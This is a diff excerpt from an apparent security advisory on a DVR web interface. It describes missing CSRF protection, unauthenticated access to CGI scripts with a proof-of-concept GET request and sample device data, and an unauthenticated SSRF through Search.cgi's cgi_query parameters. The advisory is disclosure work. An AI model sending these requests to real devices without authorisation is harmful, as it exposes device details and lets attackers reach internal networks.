@@ -17,9 +17,13 @@ The web interface does not use any CSRF protection. If a valid session exists fo
 
 ### 3) Unauthenticated information disclosure ###
 Under the /cgi-bin/nobody folder every CGI script can be accessed without authentication.
+
 POC: 
+
 `GET /cgi-bin/nobody/Machine.cgi?action=get_capability`
+
 Example response:
+
 `Firmware.Version=1011-1005-1008-1002`
 `MACAddress=00:0E:53:xx:xx:xx`
 `Product.Type=DVR`
@@ -44,9 +48,9 @@ Example response:
 `Audio.Local.Format=PCM`
 `Language.Default=ENGLISH`
 `Language.Support=ENGLISH&CHINESE&JAPANESE&FRANCE&GERMAN&SPANISH&PORTUGUESE&ITALIAN&TURKISH&POLISH&RUSSIAN&CUSTOMIZE&THAI
-`&VIETNAM&DUTCH&GREEK&ARABIC&CZECH&HUNGARIAN&HEBREW&CHINA&`
-`Capability=D0,80,A,80`
-`PushNotify.MaxChannel=8`
+&VIETNAM&DUTCH&GREEK&ARABIC&CZECH&HUNGARIAN&HEBREW&CHINA&`
+`Capability=D0,80,A,80
+PushNotify.MaxChannel=8`
 
 ### 4) Unauthenticated SSRF in DVR devices ###
 In case of DVR devices, Search.cgi can be accessed without authentication. This service is responsible for searching and accessing IP cameras in the local network. In newer firmware versions, Search.cgi provides the cgi_query action, which performs an HTTP request with the specified parameters. By modifying the ip, port and queryb64str parameters, an attacker is able to perform arbitrary HTTP requests through the DVR device without authentication.
